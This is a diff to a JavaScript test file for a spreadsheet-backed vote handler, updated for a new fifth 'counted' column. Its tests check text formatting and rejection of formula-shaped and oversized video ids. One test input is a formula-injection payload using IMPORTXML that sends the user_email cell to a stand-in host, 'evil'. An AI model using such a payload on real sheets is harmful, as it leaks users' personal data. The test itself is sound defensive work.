@@ -152,17 +152,20 @@ describe('handleVote (BE1 — Votes range stored as text; SEC4 — id gate)', ()
     expect(res.voted).toBe(true);
 
     // The range reserved for the row was number-formatted as text ('@') BEFORE
-    // the values were written — so a formula-shaped cell can't auto-execute.
-    const fmt = only(votes._formats, 4);
+    // the values were written — so a formula-shaped cell can't auto-execute. The
+    // vote write is now 5 columns (the vote-trust `counted` flag was appended).
+    const fmt = only(votes._formats, 5);
     expect(fmt.length).toBe(1);
     expect(fmt[0].fmt).toBe('@');
 
-    // ...and the value row carries the id + the adjacent user_email column.
-    const write = only(votes._writes, 4);
+    // ...and the value row carries the id + the adjacent user_email column, plus
+    // the trust flag (observe mode, so counted='true').
+    const write = only(votes._writes, 5);
     expect(write.length).toBe(1);
     const row = write[0].values[0];
     expect(row[1]).toBe('dQw4w9WgXcQ');           // video_id
     expect(row[2]).toBe('user@example.com');       // user_email (col C — the exfil target)
+    expect(row[4]).toBe('true');                   // counted flag
   });
 
   it('rejects a formula-shaped videoId before any row is written', () => {
@@ -170,14 +173,14 @@ describe('handleVote (BE1 — Votes range stored as text; SEC4 — id gate)', ()
     const res = be.handleVote({ videoId: '=IMPORTXML("https://evil/?d="&C2,"//a")', token: 't' });
     expect(res.status).toBe('error');
     expect(res.message).toMatch(/invalid videoid/i);
-    expect(only(votes._writes, 4).length).toBe(0); // nothing hit the sheet
+    expect(only(votes._writes, 5).length).toBe(0); // nothing hit the sheet
   });
 
   it('rejects an oversized videoId (junk-row flooding)', () => {
     const { be, votes } = setup();
     const res = be.handleVote({ videoId: 'a'.repeat(65), token: 't' });
     expect(res.status).toBe('error');
-    expect(only(votes._writes, 4).length).toBe(0);
+    expect(only(votes._writes, 5).length).toBe(0);
   });
 });
 
